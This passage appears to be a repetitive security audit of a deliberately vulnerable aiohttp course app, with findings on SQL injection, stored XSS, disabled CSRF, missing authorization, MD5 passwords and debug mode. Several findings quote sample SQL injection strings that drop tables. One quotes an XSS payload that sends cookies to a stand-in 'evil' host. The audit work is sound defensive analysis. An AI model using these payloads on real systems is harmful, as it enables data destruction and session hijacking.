recommendation: Set autoescape=True (the Jinja2 default) and only use the |safe filter on values known to be safe. Remove autoescape=False.

title: CSRF enforcement middleware disabled application-wide
description: The csrf_middleware (sqli/middlewares.py:25-38) that validates the _csrf_token on POST requests is commented out of the middleware chain. Although forms embed csrf_token() and a token is generated by csrf_processor, nothing ever verifies it. All state-changing POST endpoints (create student, create course, create review, evaluate/assign marks, login, logout) are therefore vulnerable to cross-site request forgery; an attacker can auto-submit forms from a malicious page to create records or (as admin) assign marks on behalf of a logged-in victim.
evidence: middlewares=[session_middleware, # csrf_middleware,\n error_middleware] at sqli/app.py:25-29 — csrf_middleware is commented out; validation logic exists but is unreachable (sqli/middlewares.py:25-38).
recommendation: Enable csrf_middleware in the middleware list and ensure every POST form submits a valid token; reject mismatches with 403.

title: Missing authorization checks on state-changing endpoints (evaluate, create student/course/review)
description: The evaluate handler assigns marks to students but performs no authentication or authorization check; the @authorize decorator exists (sqli/utils/auth.py:12-23) but is applied only to logout. The UI hides the evaluate form behind auth_user.is_admin (sqli/templates/course.jinja2:41), but the handler itself is reachable by anyone via POST /students/{id}/evaluate/{course_id}. The same missing-auth pattern applies to the mutating handlers students (POST, sqli/views.py:54-57), courses (POST, sqli/views.py:86-90) and review (POST, sqli/views.py:119-130): any unauthenticated client can create students, courses, reviews and grade students. This is a broken access control / privilege escalation flaw.
evidence: async def evaluate(request) at sqli/views.py:134 has no @authorize and no user check before Mark.create (sqli/views.py:151-152); contrast logout which is decorated with @authorize() at sqli/views.py:156.
recommendation: Apply @authorize(ensure_admin=True) to evaluate and @authorize() to the other mutating handlers (or add explicit role checks), so that privileged actions require the appropriate authenticated role.

title: Passwords hashed with unsalted MD5
description: User.check_password compares the stored hash to md5(password). Passwords are stored as unsalted MD5 (see migrations/001-fixtures.sql:10-13 which seed md5('superadmin') etc.). MD5 is fast and broken: stored hashes are trivially cracked with rainbow tables/GPU, and identical passwords produce identical hashes. If the database is read (e.g. via the SQL injection above), all account passwords including the superadmin's are recoverable.
evidence: return self.pwd_hash == md5(password.encode('utf-8')).hexdigest() at sqli/dao/user.py:41; seeds use md5('superadmin') at migrations/001-fixtures.sql:10.
recommendation: Use a slow, salted password hash (bcrypt, scrypt or argon2) via a vetted library, and migrate existing hashes on next login. Use constant-time comparison.

title: Session cookie set without HttpOnly flag
description: RedisStorage is created with httponly=False, so the session cookie is readable from JavaScript. Combined with the stored XSS enabled by autoescape=False, an attacker's injected script can read document.cookie and exfiltrate the victim's session, enabling full account takeover (including the admin). No Secure flag is set either.
evidence: storage = RedisStorage(app['redis'], httponly=False) at sqli/middlewares.py:20.
recommendation: Use httponly=True (the default) and secure=True for the session cookie; serve over HTTPS.

title: Application runs with aiohttp debug mode enabled
description: The Application is constructed with debug=True unconditionally. In production this enables verbose diagnostics/warnings and can lead to information disclosure of internal state and stack details. It is hardcoded rather than driven by configuration.
evidence: app = Application(debug=True, middlewares=[...]) at sqli/app.py:23-24.
recommendation: Drive debug from configuration/environment and default it to False in production deployments.

title: Hardcoded default database credentials in config
description: The committed configuration uses default PostgreSQL credentials (user postgres / password post****). This file is the default config loaded by app init (default_config='./config/dev.yaml', sqli/app.py:18). If this config is reused beyond local dev, the default superuser credentials provide trivial database access. These look like development defaults rather than a unique production secret, but default/weak DB credentials should still be avoided.
evidence: db.user: postgres / db.password: post**** at config/dev.yaml:2-3; loaded as default_config in sqli/app.py:18.
recommendation: Load DB credentials from environment/secrets, use non-default strong credentials, and keep real credentials out of version control.

title: Outdated dependencies with known vulnerabilities (aiohttp 3.5.3, PyYAML 3.13)
description: Several pinned dependencies are old and carry published CVEs. aiohttp==3.5.3 (requirements.txt:3) predates fixes for HTTP request smuggling and open-redirect issues (e.g. CVE-2021-21330 and later advisories) resolved in 3.7.x/3.8.x. PyYAML==3.13 (requirements.txt:15) is affected by CVE-2020-14343 (arbitrary code execution via yaml.load/full_load) fixed in 5.4. These are reachable in a running deployment via the HTTP stack and config parsing respectively.
evidence: aiohttp==3.5.3 (requirements.txt:3); pyyaml==3.13 (requirements.txt:15); jinja2==2.10 (requirements.txt:11) is also old.
recommendation: Upgrade to current supported releases (aiohttp >=3.9, PyYAML >=6, Jinja2 >=3.1) and run pip-audit regularly in CI.

title: SQL injection in Student.create via unparameterized name interpolation
description: Student.create builds the INSERT statement with Python string formatting (% operator) on the attacker-supplied `name`, then executes it without parameters. The value flows directly from an untrusted HTTP source: POST /students/ -> views.students (sqli/views.py:54-57) -> Student.create(conn, data['name']). Any anonymous user can inject arbitrary SQL (e.g. name = `x'); DROP TABLE students;--` or stacked UNION/subquery payloads). There is no authentication requirement on the handler and CSRF middleware is disabled, so this is directly reachable and exploitable. This is the headline vulnerability of the app; note every other DAO method correctly uses parameterized queries, so this one is the distinct offender.
evidence: q = ("INSERT INTO students (name) " "VALUES ('%(name)s')" % {'name': name})\nawait cur.execute(q)  # no params -> value already concatenated into SQL text
recommendation: Use a parameterized query exactly like the other DAOs: await cur.execute("INSERT INTO students (name) VALUES (%(name)s)", {'name': name}). Never interpolate user input into SQL text.

title: Passwords hashed with unsalted MD5 in User.check_password
description: User.check_password compares the stored hash against md5(password). MD5 is a fast, broken hash with no salt and no work factor, so a leaked users table (reachable via the SQLi above) is trivially cracked with rainbow tables / GPU brute force. The migration seeds users with md5('superadmin'), md5('password'), etc. (migrations/001-fixtures.sql:10-13), confirming the stored format. This affects the login flow in views.index:41.
evidence: return self.pwd_hash == md5(password.encode('utf-8')).hexdigest()\n# storage: VALUES ('Super', NULL, 'Admin', 'superadmin', md5('superadmin'), TRUE)
recommendation: Hash with a slow, salted KDF (argon2id or bcrypt), e.g. argon2.PasswordHasher, and compare with a constant-time verify. Rehash on next login during migration.

title: CSRF protection disabled application-wide
description: The csrf_middleware is commented out of the middleware chain, so no POST endpoint validates the _csrf_token that the templates render. A working token-checking middleware exists (sqli/middlewares.py:25-38) but is never installed. Every state-changing route (login POST /, /students/, /courses/, /courses/{id}/review, /students/{id}/evaluate/{id}, /logout/) can be triggered cross-site. An attacker page can force a logged-in admin's browser to create records, submit reviews, or assign marks.
evidence:
middlewares=[session_middleware,
    # csrf_middleware,
    error_middleware,
]  # csrf_middleware never added
recommendation: Re-enable csrf_middleware in the middleware list and ensure all POST forms submit the token (they already render it). Also set SameSite on the session cookie.

title: Jinja2 autoescaping disabled causing stored XSS
description: setup_jinja is configured with autoescape=False, so all template variables render raw HTML unless an explicit |e filter is applied (most are not). User-controlled data is stored and reflected unescaped: review_text submitted via POST /courses/{id}/review (views.py:129) is rendered in sqli/templates/course.jinja2:22 as `{{ review.review_text }}`; student names (students.jinja2:16) and course title/description (course.jinja2:14-15) are likewise unescaped. An anonymous user can store `<script>...</script>` in a review and execute JavaScript in every visitor's session, including admins.
evidence: setup_jinja(app, loader=PackageLoader('sqli','templates'), context_processors=[...], autoescape=False)\n# course.jinja2:22  {{ review.review_text }}  (no |e)
recommendation: Enable autoescaping (autoescape=select_autoescape(['jinja2','html']) or autoescape=True) and only mark explicitly trusted content safe. Do not rely on scattered |e filters.

title: Missing authorization on state-changing endpoints (students/courses/review/evaluate)
description: The evaluate handler assigns grades (Mark.create) with no authentication or authorization check, even though the UI gates the evaluate form behind `auth_user.is_admin` (course.jinja2:41). The authorize() decorator (sqli/utils/auth.py:12) is only applied to logout; every other mutating route is unprotected. Consequently any anonymous user can POST to /students/{id}/evaluate/{course_id} to forge marks, and the same missing-check pattern lets anyone create students (views.py:54-57), create courses (views.py:86-90), and post reviews (views.py:119-129). Reported here on evaluate as the clearest privilege violation.
evidence: async def evaluate(request): ... await Mark.create(conn, student_id, course_id, data['points'])  # no @authorize(ensure_admin=True); only logout uses the decorator
recommendation: Apply @authorize() / @authorize(ensure_admin=True) to all mutating handlers (evaluate, students POST, courses POST, review POST) and enforce server-side that the client cannot perform privileged actions it is not entitled to.

title: Session cookie set with HttpOnly disabled
description: The RedisStorage session cookie is created with httponly=False, making the session identifier readable from JavaScript. Combined with the stored XSS from disabled autoescaping, an attacker's injected script can exfiltrate any visitor's (including admin's) session cookie and hijack the account.
evidence: storage = RedisStorage(app['redis'], httponly=False)
recommendation: Use httponly=True (the default), and also set secure=True and samesite='Lax'/'Strict' for the session cookie.

title: Exception internals leaked to users via debug mode and 50x template
description: The server error template renders `{{ error.__dict__ }}` directly to the response, dumping the full internal state of the raised exception to any user who triggers a 500. Together with Application(debug=True) in sqli/app.py:24, this exposes stack/exception details that aid attackers in exploiting the other flaws (e.g. SQL errors revealing schema). Reachable by anyone who can cause an unhandled error.
evidence:
{{ error.__dict__ }}
(errors/50x.jinja2)\nApplication(debug=True, ...) (app.py:24)
recommendation: Render a generic message to users, log details server-side with a correlation id, and disable debug (debug=False) in production.

title: SQL injection in Student.create via Python string formatting
description: Student.create builds the INSERT statement with Python %-formatting, splicing the raw student name directly into SQL instead of passing it as a bound parameter. The name comes straight from attacker-controlled form data: views.students() (POST /students/) reads data['name'] from request.post() and passes it unvalidated to Student.create. Because CSRF is disabled (see separate finding) the POST is reachable by any client. An attacker can inject arbitrary SQL, e.g. name = x'); DROP TABLE students; -- or stacked/sub-select payloads to read other tables (including users.pwd_hash) via the postgres backend. Every other DAO method in the project correctly uses bound parameters; this one is the outlier.
evidence: q = ("INSERT INTO students (name) " "VALUES ('%(name)s')" % {'name': name})  # name = request.post()['name']  ->  cur.execute(q)  (no parameters passed)
recommendation: Use a parameterized query exactly like the other DAOs: await cur.execute("INSERT INTO students (name) VALUES (%(name)s)", {'name': name}). Never interpolate user input into the SQL text.

title: Global Jinja2 autoescape disabled enabling stored XSS
description: aiohttp_jinja2 is configured with autoescape=False for all templates, so every {{ ... }} emits raw, unescaped HTML. User-supplied values that are stored and later rendered become stored XSS. Concretely, review_text submitted at POST /courses/{id}/review is stored by Review.create and rendered unescaped at sqli/templates/course.jinja2:22; course.title/description (courses.jinja2 / course.jinja2:14-15) and student name (students.jinja2:16) are likewise attacker-controlled and rendered raw. A payload like <script>document.location='//evil/?c='+document.cookie</script> in a review will execute in every visitor's browser, and because the session cookie is not HttpOnly (separate finding) it can steal sessions.
evidence: setup_jinja(app, loader=PackageLoader('sqli','templates'), context_processors=[...], autoescape=False)  ->  course.jinja2:22 `{{ review.review_text }}` renders stored user input unescaped
recommendation: Set autoescape=True (the default) in setup_jinja, and use explicit |safe only where output is known-safe. Validate/encode user input on the way in as defense in depth.

title: Passwords stored and verified with unsalted MD5
description: User.check_password compares the stored pwd_hash against an unsalted single-round MD5 of the supplied password. MD5 is cryptographically broken and extremely fast to brute-force, and the lack of a per-user salt enables rainbow-table and batch cracking. If the users table is leaked (e.g. via the SQL injection above), all passwords are trivially recoverable, including admin accounts. The same MD5 scheme is implied for password creation (the fixtures/migrations seed pwd_hash values).
evidence: return self.pwd_hash == md5(password.encode('utf-8')).hexdigest()
recommendation: Use a memory-hard adaptive password hash (Argon2id via argon2-cffi, or bcrypt) with per-user salts, and migrate existing hashes on next login. Also use a constant-time comparison.

title: No server-side authorization on state-changing and admin actions
description: The authorize() decorator exists but is applied only to logout. The evaluate handler assigns grades to students for a course and is gated behind {% if auth_user.is_admin %} in the UI only (course.jinja2:41) — the handler itself performs no authentication or admin check, so any anonymous client can POST /students/{id}/evaluate/{course_id} and set marks, a privilege-escalation / broken-access-control flaw. The same missing-authorization pattern affects students() POST (create student, views.py:54-57), courses() POST (create course, views.py:86-90) and review() POST (create review, views.py:119-129): none require authentication. With CSRF disabled these are directly reachable.
evidence: async def evaluate(request): ... student_id=...; course_id=...; data = await request.post(); ... await Mark.create(conn, student_id, course_id, data['points'])  # no @authorize / is_admin check
recommendation: Apply @authorize(ensure_admin=True) to evaluate and any admin-only mutation, and @authorize() to the other POST handlers that create data. Enforce authorization server-side, deny by default.

title: CSRF protection middleware disabled application-wide
description: A working csrf_middleware is implemented in sqli/middlewares.py (validates a session-bound _csrf_token on POST), but it is commented out of the application's middleware list, so no CSRF validation runs on any POST route. All state-changing endpoints (login, create student/course/review, evaluate/grade, logout) are therefore vulnerable to cross-site request forgery, and the absence of CSRF checks also makes the unauthenticated SQLi/XSS injection endpoints trivially reachable from a victim's browser.
evidence: middlewares=[ session_middleware, # csrf_middleware, error_middleware ]  (csrf_middleware commented out)
recommendation: Re-enable csrf_middleware in the middleware chain and ensure every form submits the csrf_token() hidden field; reject POSTs with a missing/mismatched token.

title: Session cookie set with HttpOnly disabled
description: RedisStorage is instantiated with httponly=False, so the session cookie is readable from JavaScript via document.cookie. Combined with the global XSS exposure (autoescape disabled), any injected script can exfiltrate the session cookie and hijack authenticated/admin sessions. The cookie is also not marked Secure, so it can leak over plaintext HTTP.
evidence: storage = RedisStorage(app['redis'], httponly=False)
recommendation: Use the default httponly=True (and set secure=True behind TLS, plus samesite='Lax'/'Strict') so the session identifier is not accessible to client-side scripts.

title: Application runs with debug mode enabled
description: The aiohttp Application is constructed with debug=True (and run.py configures root logging at DEBUG). Debug mode enables verbose diagnostics and more detailed error surfacing, which can disclose internal state and stack information to clients and increases attack surface. This should never be enabled in a deployed environment.
evidence: app = Application(debug=True, middlewares=[...])
recommendation: Drive debug from configuration/environment and default it to False in production; keep log levels at INFO/WARNING in deployed environments.

title: Hardcoded default database credentials in config
description: The database is configured with the well-known default postgres/postgres credentials committed in the repository and consumed by services/db.py to build the DSN. If this config is reused beyond local development (the docker-compose setup wires these services together), the default credentials provide trivial database access. Secrets should not live in version control.
evidence:
db:
  user: postgres
  password: postgres  ->  services/db.py builds 'dbname={database} user={user} password={password} ...'.format(**conf)
recommendation: Load credentials from environment variables or a secrets manager, use strong non-default passwords, and keep real secrets out of the repository.

title: Unauthenticated SQL injection in Student.create
description: Student.create builds the INSERT statement with Python %-formatting of the raw student name, instead of passing it as a bound parameter. The name originates from request.post()['name'] in views.students (POST /students/, sqli/routes.py:14), which has no authentication or authorization check, so any anonymous visitor can inject arbitrary SQL. Because the value is placed inside a single-quoted literal, an attacker can break out with a quote (e.g. name=x'); DROP TABLE marks;-- or a subquery) to read or modify any table, including the users/pwd_hash table. This is the canonical sink of the whole project.
evidence: q = ("INSERT INTO students (name) " "VALUES ('%(name)s')" % {'name': name})\nawait cur.execute(q)  -- name flows unparameterized from views.students: await Student.create(conn, data['name'])
recommendation: Use a parameterized query exactly like the other DAOs: cur.execute("INSERT INTO students (name) VALUES (%(name)s)", {'name': name}). Never interpolate user input into the SQL string with % or f-strings.

title: Passwords stored and verified as unsalted MD5
description: User.check_password compares the stored pwd_hash against md5(password). MD5 is fast, broken, and used here without a salt, so any leaked pwd_hash (e.g. via the SQL injection above) is trivially cracked with rainbow tables or brute force. The fixtures in migrations/001-fixtures.sql confirm storage as md5('superadmin') etc. This affects all account credentials including the superadmin.
evidence: from hashlib import md5\n...\nreturn self.pwd_hash == md5(password.encode('utf-8')).hexdigest()  -- seeded via md5('superadmin') in migrations/001-fixtures.sql:10
recommendation: Use a memory-hard, salted password hash such as Argon2id (argon2-cre/argon2-cffi) or bcrypt, and migrate existing hashes. Compare using the library's constant-time verify function.

title: Missing authorization on state-changing endpoints (evaluate, students, courses, review)
description: The evaluate handler assigns grades to students but has no authentication/authorization check; only the logout handler uses the @authorize decorator defined in sqli/utils/auth.py. The UI exposes evaluation only to admins (course.jinja2 gates the form with auth_user.is_admin), but the route POST /students/{student_id}/evaluate/{course_id} enforces nothing server-side, so any anonymous user can submit marks. The same missing-authorization flaw applies to POST /students/ (views.students, lines 54-57, creates students), POST /courses/ (views.courses, lines 86-89, creates courses), and POST /courses/{course_id}/review (views.review, lines 119-131, creates reviews). Authorization is enforced client-side in templates only.
evidence: async def evaluate(request): ... await Mark.create(conn, student_id, course_id, data['points'])  -- no @authorize / no is_admin check; compare sqli/utils/auth.py authorize() used only on logout (views.py:156)
recommendation: Apply the existing @authorize(ensure_admin=True) decorator (or an equivalent server-side ownership/role check) to every state-changing handler. Enforce authorization at the server, never rely on template-level hiding.

title: Stored XSS via globally disabled Jinja2 autoescaping
description: aiohttp_jinja2 is configured with autoescape=False, so template variables are emitted raw unless an explicit |e filter is used. Several templates render attacker-controlled, persisted data without escaping: course.jinja2 renders review.review_text (line 22) and course.title/description (lines 14-15), and courses.jinja2 renders course.title/description (lines 17-18). An unauthenticated user can POST a review (or course) containing <script>..</script> which is then served to every visitor of the course page, yielding stored XSS and, combined with the non-HttpOnly session cookie, session hijacking.
evidence: setup_jinja(app, loader=PackageLoader('sqli', 'templates'), context_processors=[...], autoescape=False)  -- sink: course.jinja2:22 {{ review.review_text }}; source: views.review -> Review.create(conn, course_id, review_text) from request.post()
recommendation: Set autoescape=True (default for HTML templates) and only mark genuinely trusted values with |safe. Audit templates to remove reliance on raw output.

title: CSRF protection middleware disabled
description: A functional CSRF-checking middleware exists (sqli/middlewares.py:csrf_middleware) and templates embed a _csrf_token hidden field, but the middleware is commented out of the application's middleware list, so no CSRF validation occurs on any POST. An attacker can forge cross-site requests to create students/courses/reviews, assign marks, or log the victim out, because state-changing POSTs rely only on the ambient session cookie (which is also not SameSite-restricted).
evidence: middlewares=[ session_middleware, # csrf_middleware, error_middleware ]  -- csrf_middleware defined but never installed
recommendation: Enable csrf_middleware in the middleware chain (and ensure it runs after the session middleware), or adopt a maintained CSRF library. Also set SameSite=Lax/Strict on the session cookie.

title: Session cookie set with HttpOnly disabled
description: The Redis session storage is constructed with httponly=False, so the session cookie is readable by client-side JavaScript. Combined with the stored XSS from disabled autoescaping, this lets an attacker exfiltrate session cookies via document.cookie and take over accounts (including superadmin). No Secure flag is set either, allowing interception over plaintext HTTP.
evidence: storage = RedisStorage(app['redis'], httponly=False)
recommendation: Use httponly=True (the default) and set secure=True plus samesite on the session cookie so it is inaccessible to scripts and only sent over TLS.

title: Application runs with debug mode enabled
description: The aiohttp Application is instantiated with debug=True, and run.py sets logging to DEBUG. Debug mode changes error handling/verbosity and can surface internal details and tracebacks, aiding attackers in reconnaissance. This should never be enabled in a deployed environment.
evidence: app = Application(debug=True, middlewares=[...])  -- plus logging.basicConfig(level=logging.DEBUG) in run.py:11
recommendation: Drive debug and log level from configuration/environment and default them off in production; present generic error pages only.
